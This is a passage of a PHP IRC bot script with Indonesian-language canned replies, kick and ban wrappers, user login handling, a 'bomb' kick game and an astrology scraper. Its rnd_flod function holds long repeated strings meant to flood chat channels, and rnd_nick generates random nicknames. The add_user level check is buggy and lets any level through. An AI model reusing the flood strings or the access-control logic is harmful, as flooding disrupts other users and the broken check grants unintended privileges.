"3,1 ","3,2 ","3,2 ","3,4 ","3,5 ","3,6 ","3,7 ","3,8 ","3,9 ","3,10 ","3,11 ","3,12 ","3,13 ","3,14","3,15",
"4,1 ","4,2 ","4,2 ","4,4 ","4,5 ","4,6 ","4,7 ","4,8 ","4,9 ","4,10 ","4,11 ","4,12 ","4,13 ","4,14","4,15",
"5,1 ","5,2 ","5,2 ","5,4 ","5,5 ","5,6 ","5,7 ","5,8 ","5,9 ","5,10 ","5,11 ","5,12 ","5,13 ","5,14","5,15",
"6,1 ","6,2 ","6,2 ","6,4 ","6,5 ","6,6 ","6,7 ","6,8 ","6,9 ","6,10 ","6,11 ","6,12 ","6,13 ","6,14","6,15",
"7,1 ","7,2 ","7,2 ","7,4 ","7,5 ","7,6 ","7,7 ","7,8 ","7,9 ","7,10 ","7,11 ","7,12 ","7,13 ","7,14","7,15",
"8,1 ","8,2 ","8,2 ","8,4 ","8,5 ","8,6 ","8,7 ","8,8 ","8,9 ","8,10 ","8,11 ","8,12 ","8,13 ","8,14","8,15",
"9,1 ","9,2 ","9,2 ","9,4 ","9,5 ","9,6 ","9,7 ","9,8 ","9,9 ","9,10 ","9,11 ","9,12 ","9,13 ","9,14","9,15",
"10,1 ","10,2 ","10,2 ","10,4 ","10,5 ","10,6 ","10,7 ","10,8 ","10,9 ","10,10 ","10,11 ","10,12 ","10,13 ","10,14","10,15",
"11,1 ","11,2 ","11,2 ","11,4 ","11,5 ","11,6 ","11,7 ","11,8 ","11,9 ","11,10 ","11,11 ","11,12 ","11,13 ","11,14","11,15",
"12,1 ","12,2 ","12,2 ","12,4 ","12,5 ","12,6 ","12,7 ","12,8 ","12,9 ","12,10 ","12,11 ","12,12 ","12,13 ","12,14","12,15",
"13,1 ","13,2 ","13,2 ","13,4 ","13,5 ","13,6 ","13,7 ","13,8 ","13,9 ","13,10 ","13,11 ","13,12 ","13,13 ","13,14","13,15",
"14,1 ","14,2 ","14,2 ","14,4 ","14,5 ","14,6 ","14,7 ","14,8 ","14,9 ","14,10 ","14,11 ","14,12 ","14,13 ","14,14","14,15",
"15,1 ","15,2 ","15,2 ","15,4 ","15,5 ","15,6 ","15,7 ","15,8 ","15,9 ","15,10 ","15,11 ","15,12 ","15,13 ","15,14","15,15"
);

$badwordlist = array("Tahe","hede","puki","luji","yogor","cuki","pemai",
"laso","anjing","babi","binatang","kodo","hutu","tele","mbuo","setan",
"sex","askum","ngango","pendo");

$rjorok = array(
"beugh..! <nick> p mulu ni kurangajar ahm.. mo lapor pt sibego akh!",
"walah..! <nick> ini ga sopan banget.. kick dunk pliss!",
"jah.. <nick> tdk sopan ekh, gaga mo toki.. ikz -_-~!"
);

$rcacian = array(
"idih, <nick> tuch yg <kata>",
"<kata>? bukanya <nick> tuh yg <kata>?",
"gw mmg <kata>, tp <nick> lebih <kata> lagi",
"gw ga <kata> tuh, yg <kata> itu <nick> kan?"
);
$rwarna = array(
"Virus warna terdeteksi...!!!",
"So Ba Warna Poli <nick> wuaa..",
"Warna? Kick Kick jow t <nick>"
);

$rpujian = array(
"makasih <nick>.. kamu jg koq",
"<nick> baik deh..",
"ga kok <nick>.. km lebih <kata>",
"<kata>? hihi.. <nick> bisa aja",
"tengkyu <nick>.. aduh $namaku g punya uang kecil nih.."
);

#################### [ END CREWET ] ######################
##################### [ CONNECT ] #####################
/////////////////
$servdef=array("irc.myquran.com",
	       "irc.indoforum.org",
               "irc.telkom.net.id"
               );
$keluar=0;$retry=count($servdef)+1;$attconnect=0;$rtdc=0;
/////////////////
################### [ CLASS IRC BOT ] #####################
class module_bot{
    function rnd_logo(){
        $nlogo=array("ANAKBEGO-COMMUNITY","VheBry-CIntaku",
                     "LOVE-U-HONEY","LOVE my HONEY",
                     "ANAKBEGO","ANAK-dari-JECK_love_Vhebry",
                     "Crew-ANAKBEGO-COMMUNITY","ANAKBEGO-se-INDONESIA-TIMUR"
                     );
        return $nlogo[rand(0,count($nlogo) - 1)];
    }
    function rand_str($size){
        $feed = "0123456789abcdefghijklmnopqrstuvwxyz";
        for ($i=0; $i < $size; $i++){$rand_str .= substr($feed, rand(0, strlen($feed)-1), 1);}
        return $rand_str;
    }
    function rnd_nick(){
        $nickbota=array("q","w","r","t","y","p","s","d","g","h","j","k","l","z","x","v","b","n","m");
        $nickbotb=array("e","y","u","i","o","a");
        $nickdepan=$nickbota[rand(0,count($nickbota) - 1)].$nickbotb[rand(0,count($nickbotb) - 1)]."_";
        $nickbotl=$nickbota[rand(0,count($nickbota) - 1)];
        $nickbotr=$nickbotb[rand(0,count($nickbotb) - 1)];
        $nickbotu=$nickbota[rand(0,count($nickbota) - 1)];
        $nickbotd=$nickbotb[rand(0,count($nickbotb) - 1)];
        $nickbot=$nickdepan.$nickbotl.$nickbotr.$nickbotu.$nickbotd;
        return $nickbot;
    }
    function rnd_real(){
        $realbot=array("1,0�4����1�4S1trang4L1ed1�4����1�");
        return $realbot[rand(0,count($realbot) - 1)];
    }
    function rnd_away(){
        $awaybot=array("Bot by ANAKBEGO-COMMUNITY");
        return $awaybot[rand(0,count($awaybot) - 1)];
    }
    function rnd_cycle(){
        $strcycle=array("mencari bos sibego","mencari pacar boz sibego dlo","baca SMS","jungkir balik","brb.. cari pa Vhebry dulu","ganti server");
        return $strcycle[rand(0,count($strcycle) - 1)];
    }
    function rnd_flod(){
        $strflod=array("[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi",
                       "4,4@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
                       "",
                       "[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi",
                       "@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@",
                       "[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi"
                       );
        return $strflod[rand(0,count($strflod) - 1)];
    }
    function rnd_slapampun(){
        $sampunbot=array("bos kojom yuk!","aku neng kene bos!! ojo atek dislaps!!","sini? pv aq bos","kenapa bos?!!","wedew","muach..muach...","ciatsssss... hehehe..","slap? pingin di tium ta?","ampun bosss, aku ndak nakal lagi","siaaaappp bos, ada yang bisa saya buantingin? piring, gelas gtu..",
                         "hiks..nasib?","jadi tukang slap ya, bos?","edan!!!","mama... tolong....","papa... tolong...","ada apa bos!!!, slap? ra ngerti sik kojom apa?","watauuu tega banget kau boss!!!","Siap!!!","aku di sini sayang","lagi enak? kojom dislap ikz.",
                         "Ready!!","aduh...jangan di slap dong.. pv aja","iya sayang...","Boss JELEK!!!","Ready to command!","scream!!!!","mama... bos Q jahat!","jahat banget sihh..","What Mission?");
        return $sampunbot[rand(0,count($sampunbot) - 1)];
    }
    function rnd_slapme(){
        $slapme=array("egk boleh slap ya say...","tak ada ampun buat loh!","mangisooo ae... 4Dont Slap Me!!","heheheh ciatsssssssssss. tendangan jet lee","Rasakan ini...","Dudutz","yeee...pv aja, gk usah pake slap..");
        return $slapme[rand(0,count($slapme) - 1)];
    }
    function rnd_slapbos(){
        $slapbos=array("huneQ jangan dislap!!","Dont slap my bos!!","Kacian Bos Tauw!!!","bosQ masih sibuk","bosQ lagi tidur, mohon jangan di ganggu","2HaKz DeZz..","2Awas..!!!","2eiT's..","2HayOo NaKaLs..","jangan ganggu boskuuuuuu","ra ngerti bos lagi sibuk apa... ciattttttttttt jwedak");
        return $slapbos[rand(0,count($slapbos) - 1)];
    }
    #### MODULE IRC #######
    
    function send($sock,$msg){fputs($sock,"$msg".CRLF); }
    function quit($sock,$msg){if($msg){$this->send($sock,"QUIT :$msg");}  else {$this->send($sock,"QUIT");}sleep(1);   }
    function msg($sock,$to,$msg){$this->send($sock,"PRIVMSG $to :$msg");}
    function act($sock,$to,$msg){$this->send($sock,'PRIVMSG '.$to.' :'.'ACTION '.$msg.'');}
    function invite($sock,$to,$chan){$this->send($sock,"INVITE $to $chan");}
    function notice($sock,$to,$msg){$this->send($sock,"NOTICE $to :$msg");}
    function join($sock,$chan,$kunci=Null){$this->send($sock,"JOIN $chan $kunci"); }
    function part($sock,$chan,$msg){if($msg){$this->send($sock,"PART $chan :$msg");}  else {$this->send($sock,"PART $chan");}   }
    function Cycle($sock,$chan,$msg){ if ($msg){$this->part($sock,$chan,$msg);}else{$this->part($sock,$chan,$msg);}        sleep(2);        $this->join($sock,$chan);    }
    function nick($sock,$newnick){$this->send($sock,"NICK $newnick");$bot['nick']=$newnick;   }
    function mode($sock,$mod,$chan,$who){$this->send($sock,"MODE $chan $mod $who");    }
    function kick($sock,$chan,$who,$msg){if($msg){$this->send($sock,"KICK $chan $who :$msg");}else{$this->send($sock,"KICK $chan $who");}    }
    function kickserv($sock,$chan,$who,$msg){$this->msg($sock,"CHANSERV","KICK $chan $who $msg"."");    }
    function ban($sock,$chan,$who){$this->send($sock,"MODE $chan +b $who");    }
    function unban($sock,$chan,$who){$this->send($sock,"MODE $chan -b $who");    }
    function away($sock,$msg){$this->send($sock,"AWAY :$msg");    }
    function noaway($sock){$this->send($sock,"AWAY");    }
    function topic($sock,$chan,$msg){$this->send($sock,"TOPIC $chan $msg");    }
    ####################
    
    
    ##########################
    function add_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"] = $user_chan_arr[strtolower($chan)]["nick"].' '.$nick. ' ';
        $user_chan_arr[strtolower($chan)]["chan"]=strtolower($chan);
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function change_nickchan($nick,$newnick){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
            $x_chan=$cur_xchan["chan"];
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace(' '.$nick.' ',' '.$newnick.' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ',' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
            $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ','',$user_chan_arr[strtolower($x_chan)]["nick"]);
	}
        return "ok";
    }
    function del_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace(' '.$nick.' ',' ',$user_chan_arr[strtolower($chan)]["nick"]);
	$user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function show_nickchan($chan){
        global $user_chan_arr;
        $res_nick=$user_chan_arr[strtolower($chan)]["nick"];
        $res_nick=ltrim($res_nick);
        return $res_nick;
    }
    function show_chan(){
        global $user_chan_arr,$bot;
        foreach ($user_chan_arr as $cur_xchan) {
            $showchn=$cur_xchan["chan"];
            if($bot['roomnet']==$cur_xchan["chan"]){$showchn="";};
            if($bot['basechan']==$cur_xchan["chan"]){$showchn="";};
            if($showchn!=""){$res_chan=$res_chan.';'.$cur_xchan["chan"];}
	}
        return $res_chan;
    }
    function destroy_chan($chan){
        global $user_chan_arr;
        unset ($user_chan_arr[$chan]);
        return "ok";
    }
    function destroy_allchan(){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
		unset ($user_chan_arr[$cur_xchan["chan"]]);
	}
        unset ($user_chan_arr);
        return "ok";
    }
    #####################
    
    function user_list($nick){
        global $auth;
        $userlist="";
	foreach ($auth as $ulist) {if($ulist["name"]){$userlist .= $ulist["name"].'('.$ulist["status"].')';}}
        return $userlist;
    }
    function add_user($sock,$nick,$user,$pass,$level){
        global $auth,$bot;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        $level = strtolower($level);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
                if ($level=="master" || $level=="user" || $level="admin") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                    $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> <admin|master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($level=="master" || $level=="user") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                    $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> <master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="master") {
		if (!$auth["$nick"]["name"]) {
                    if ($level=="user") {
			$auth["$user"]["name"] = $user;
			$auth["$user"]["pass"] = $pass;
			$auth["$user"]["status"] = $level;
			$auth["$user"]["auth"] = 1;
                        $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                        $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                        $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    } else { $this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> user'); }
		} else { $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.'); }
            } else {$this->notice($sock,$nick,'Unknown Status! Your Status is '.$auth["$nick"]["status"]);}
        }
    }
    function del_user($sock,$nick,$user){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user" || $auth["$user"]["status"]=="admin") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="master") {
                if ($auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else { $this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
	}
    }
    function chgpass_user($sock,$nick,$oldpass,$newpass){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
        if ($auth["$nick"]["auth"]==2) {
	    if ($oldpass===$auth["$nick"]["pass"]) {
		$auth["$nick"]["pass"] = $newpass;
                $this->notice($sock,$nick,'Password set to: 4'.$auth["$nick"]["pass"].'4');
            } else {$this->msg($sock,$nick,'PASSWORD 4!FaILED!');}
	}
    }
    function level_user($nick){
        global $auth;
        $nick=strtolower($nick);
        if ($auth["$nick"]["status"]=="user"){$stauth=1;}
	elseif ($auth["$nick"]["status"]=="master"){$stauth=2;}
	elseif (strtolower($auth["$nick"]["status"])=="admin"){$stauth=3;}
        elseif (strtolower($auth["$nick"]["status"])=="owner"){$stauth=4;}
        else{$stauth=0;};
        return $stauth;
    }
    function is_userbot($nick){
        global $auth;
        $isuser=0;$nick=strtolower($nick);
        if ($auth["$nick"]) {if ($auth["$nick"]["pass"]) {$isuser=1;}}
        return $isuser;
    }
    function is_loginbot($nick,$ident,$host){
        global $auth;
        $islogin=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($auth["$nick"]["auth"]==2){
                if($auth["$nick"]["ident"]==$ident){
                    if($auth["$nick"]["host"]==$host){
                        $timelog=time()- $auth["$nick"]["time"];
                        if($timelog<=3600){ $auth["$nick"]["time"]=time();$islogin=1;}else{$auth["$nick"]["auth"]=1;}
                    }else{$auth["$nick"]["auth"]=1;}
                }else{$auth["$nick"]["auth"]=1;}
            }else{$auth["$nick"]["auth"]=1;}
        }
        return $islogin;
    }
    function loginbot($nick,$ident,$host,$pass){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($pass===$auth["$nick"]["pass"]){
                $auth["$nick"]["auth"]=2;$auth["$nick"]["time"]=time();$sukseslog=1;
            }
        }
        return $sukseslog;
    }
    function logoutbot($nick){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
                $auth["$nick"]["auth"]=1;$auth["$nick"]["time"]=time();$sukseslog=1;
        }
        return $sukseslog;
    }
    ###############################
    
    function stuf_ping($sock,$chan,$nick){
        global $ping;
        $sendping=time();$ping["$sendping"]["ping"] = time();
	$ping["$sendping"]["chan"] = $chan;$ping["$sendping"]["nick"] = strtolower($nick);
	$this->msg($sock,$nick,'PING '.$ping["$sendping"]["ping"].'');
    }
    function stuf_lag($sock,$nick,$dataping){
        global $ping;
        $dataping=str_replace(chr(1),"",$dataping);$dataping=str_replace("\r","",$dataping);
        $dataping=str_replace("\n","",$dataping);$dataping=str_replace("","",$dataping);
        if ($ping["$dataping"]["ping"]==$dataping && $ping["$dataping"]["nick"]==strtolower($nick)){
            $pong = time();$pptime = $pong - $dataping;$meni = "";
            $wakptime=$pptime;
            if ($pptime>=60) {
                $bag = $pptime / 60;$meni = floor($bag)."mins ";$sis = $pptime - ($meni*60);$pptime = $sis;
            }
            $deti = $pptime."secs";$pptime = "$meni$deti";
            $mswktny=array("0","1","2","3","4","5","6","7","8","9");
            $ttlny =array("32","42","46","48","56","62");
            $wktny1 = $mswktny[rand(0,count($mswktny) - 1)];
            $wktny2 = $mswktny[rand(0,count($mswktny) - 1)];
            $wktny3 = $mswktny[rand(0,count($mswktny) - 1)];
            $ttlar= $ttlny[rand(0,count($ttlny) - 1)];
            $mswktny = ( $wktny1.$wktny2.$wktny3 );
            $wktuping = ( $wakptime.'.'.$mswktny );
            if ($wakptime<=5){$stping=" masih normal ";
            }elseif($wakptime>=5){$stping=" Lumayan ";
            }elseif($wakptime>=10){$stping=" Lemot banget seh ";
            }elseif($wakptime>=15){$stping=" Macet ";
            }elseif($wakptime>=20){$stping=" Ganti server jow ";
            }elseif($wakptime>=25){$stping=" Beugh.. banting jow ";
            }
            $this->msg($sock,$ping["$dataping"]["chan"],'Lag Reply '.$nick.' Time='.$wktuping.'ms TTL='.$ttlar);
            $this->notice($sock,$nick,$stping.$nick);
            unset($ping["$dataping"]["nick"]);unset($ping["$dataping"]["ping"]);unset($ping["$dataping"]["chan"]);
        }
    }
    #############################
    function stuf_potong($sock,$nickna,$chan,$pilwar){
        global $warnabenar,$bw,$targetboom,$goboom,$onboom,$chanboom;
        $pilihanwar=strtolower($pilwar);$warnabenar=strtolower($warnabenar);
        if(strtolower($nickna)==strtolower($targetboom) && strtolower($chanboom)==strtolower($chan)){
            if($pilihanwar==strtolower($bw[0]) || $pilihanwar==strtolower($bw[1]) || $pilihanwar=="biru" ){
                if($warnabenar==$pilihanwar){
                    $this->msg($sock,$chan,'Selamat '.$nickna.', kamu berhasil menjinakan Bom!!');
                    $this->mode($sock,'+vvv',$chan,$nickna);
		}
		else{
                  //  $this->kickserv($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Selamat anda kena bom.');
                    $this->kick($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Selamat anda kena bom.');
		}
                $goboom=0;$onboom="off";$targetboom="";$chanboom="";
           }
        }
    }
    function stuf_bom($sock,$chan,$targetbm){
        global $chanboom,$bot,$onboom,$warnaboom,$targetboom,$bw,$goboom,$tmpwbom,$tmboom,$warnabenar,$timeboom;
        if(strpos(strtolower($this->show_nickchan($chan)),' '.strtolower($targetbm).' ') && $onboom=="off" && $targetbm!=strtolower($bot['nick'])){
            $onboom="on";$goboom=0;$targetboom=$targetbm;$chanboom=$chan;
            $tmpwbom=$warnaboom;$wrnb=explode(";",$tmpwbom);
            $bw[0]=$wrnb[rand(0,count($wrnb) - 1)];unset($wrnb);
            $tmpwbom=str_replace($bw[0],"",$tmpwbom);$tmpwbom=str_replace(";;",";",$tmpwbom);
            $wrnb=explode(";",$tmpwbom);
            $bw[1]=$wrnb[rand(0,count($wrnb) - 1)];
            unset($wrnb);
            $tmboom=time();$warnabenar=$bw[rand(0,count($bw) - 1)];
            $this->act($sock,$chan,'memasukan BOM ke dalam baju '.$targetbm .' '.$warnabenar);
            $this->msg($sock,$chan,$targetbm.'!! km punya waktu ['.$timeboom.'] detik. Jinakkan Bom dengan memotong kabel yg benar. Dan hanya ada tiga kabel. '.$bw[0] .', '.$bw[1].' dan Biru');
       }
    }
    #############################
    function stuf_ison($sock,$msg){
        global $listison,$chanson,$ada2,$ada1;
        $listson=strtolower($msg);$xpgetison=explode(" ",$listson);
	$i=0;$jmlolol=0;
	foreach ($xpgetison as $pgetlist){if($pgetlist){$i++;$sonson[$i]=$pgetlist;$jmlolol=$i;}}
	$i=0;
	foreach ($listison as $pgetlist){if ($pgetlist){$i++;$lsonson[$i]=$pgetlist;$jmlson=$i;}}
	$dafonline="";$dafoffline="";
	for ($i = 1; $i <= $jmlson; $i++) {
            $satup=$lsonson[$i];$ds=0;
            for ($p = 1; $p <= $jmlolol; $p++) {if ($satup==$sonson[$p]){$ds=1;}}
            if ($ds==1){if(!$ada1["$satup"]){$dafonline .=$satup.' ';$ada1["$satup"]=true;$ada2["$satup"]=false;}}
            else{if(!$ada2["$satup"]){$dafoffline .=$satup.' ';$ada2["$satup"]=true;$ada1["$satup"]=false;}}
	}
	$dafonline=ltrim($dafonline);$dafonline=rtrim($dafonline);$dafoffline=ltrim($dafoffline);$dafoffline=rtrim($dafoffline);
	if ($dafonline){fputs($sock, 'PRIVMSG '. $chanson .' :15(04Ison15) On IRC : '.$dafonline . CRLF);}
	if ($dafoffline){fputs($sock, 'PRIVMSG '. $chanson .' :15(04Ison15) Left IRC : '.$dafoffline . CRLF);}
	unset($lsonson);unset($sonson);
    }
    function add_ison($str){
        global $listison;
        $str=strtolower($str);
        if(in_array($str,$listison)){return 0;}
        else{array_push($listison,$str);return 1;}
        
    }
    function show_ison(){

        global $listison;
        $str_ison="";
        foreach ($listison as $lstr){$str_ison.=$lstr . ' ';}
        $str_ison=str_replace("  "," ",$str_ison);$str_ison=ltrim($str_ison);$str_ison=rtrim($str_ison);
        return $str_ison;
    }
    function del_ison($str){
        global $listison;
        $str_ison="";$str=strtolower($str);
        if(in_array($str,$listison)){
            foreach ($listison as $lstr){
                if(strtolower($str)!=strtolower($lstr)){
                    $str_ison.=$lstr . ';';
                }
            }
            $str_ison=str_replace(";;",";",$str_ison);$str_ison=ltrim($str_ison,";");$str_ison=rtrim($str_ison,";");
            $listison=explode(";",strtolower($str_ison));
            return 1;
        }
        else{return 0;}
    }
    ###############################
    function auto_cy($sock){
        global $systembot,$user_chan_arr;
        $this->send($sock,"PING :88888654476");
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['AUTOCYCLE'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->part($sock,$cur_xchan["chan"],$this->rnd_cycle());sleep (2);$this->join($sock,$cur_xchan["chan"]);sleep(3);
            }
	}
        return "";
    }
    
    ##############################
    function mod_astro($astro){
        global $zodiak;
        $astro = strtolower($astro);
        $this->send($sock,"PING :1097658652");
        if (in_array($astro, $zodiak)) {
            $pages = "http://www.astaga.com/astrologi/?cat=$astro";
            $handi = fopen ($pages, "rb");
            $konten = "";
            do {
               $baris = fread($handi, 512);
               if (strlen($baris) == 0) { break; }
               $konten .= $baris;
            } while(true);
            fclose ($handi);
            $this->send($sock,"PING :1097658651");
            $zod1 = stristr($konten,'<td id=ast><p>');
            $zod2 = stristr($zod1,'</table>');
            $bintang = str_replace($zod2,"",$zod1);
            $bintang = str_replace("\n","",$bintang);
            $bintang = str_replace("<td id=ast><p>","".ucfirst(strtolower($astro))." ",$bintang);
            $bintang = str_replace("</p>"," ",$bintang);
            $bintang = str_replace("<p><b>","",$bintang);
            $bintang = str_replace("</b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("<b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
